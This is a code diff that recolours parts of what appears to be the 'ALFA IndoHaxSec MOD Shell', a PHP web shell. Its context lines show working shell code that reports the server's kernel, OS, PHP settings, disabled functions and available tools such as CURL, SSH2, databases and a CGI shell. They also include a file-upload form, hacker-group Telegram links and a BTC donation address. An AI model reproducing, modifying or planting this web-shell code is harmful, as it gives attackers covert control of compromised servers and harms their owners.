@@ -820,7 +820,7 @@ echo "<body bgcolor=#800080>";
 echo '<b><big><font color=#FFC0CB>Kernel : </font><font color="#FFC0CB">'.(function_exists('php_uname')?php_uname():'???').'</font></b></big>';
 $safe_mode = @ini_get('safe_mode');
 if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: pink'>Off</b>";}
-echo "<br><b style='color: #4B0082'>OS: </font><font color=pink>" . PHP_OS . "</font><br>";
+echo "<br><b style='color: #FFC0CB'>OS: </font><font color=pink>" . PHP_OS . "</font><br>";
 echo "<b style='color: #7CFC00'>Software: </font><font color=pink>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
 echo "PHP Version: <font color=pink>" . PHP_VERSION .  "</font><br />";
 echo "PWD:<font color=#FFC0CB> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
@@ -1182,7 +1182,7 @@ echo '<tr>
 <td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
 </tr>
 <tr>
-<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/InoHaxSec2" target="_blank"><span><font class="solevisible-text" color="#DC143C">ALFA IndoHaxSec MOD Shell<br>Mod by FidzXploit</font></span></a></center></div></td>
+<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/InoHaxSec2" target="_blank"><span><font class="solevisible-text" color="#FFC0CB">ALFA IndoHaxSec MOD Shell<br>Mod by FidzXploit</font></span></a></center></div></td>
 </tr>
 <tr>
 <td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
@@ -2302,7 +2302,7 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 <input type='hidden' name='ajax' value='true'>
 <input type='hidden' name='alfa1' value='uploadFile'>
 <input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
-<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>IndoHaxSec Team &copy; 2024-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Join Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'>https://t.me/IndoHaxSec2</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/IndoHaxSec2'></a></span></div></td>
+<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>IndoHaxSec Team &copy; 2024-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #FFC0CB;text-decoration: none;'>Join Us !</a></span> <span style='letter-spacing: 2px;color: #FFC0CB;'>https://t.me/IndoHaxSec2</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/IndoHaxSec2'></a></span></div></td>
 </tr>
 </table>
 </div>
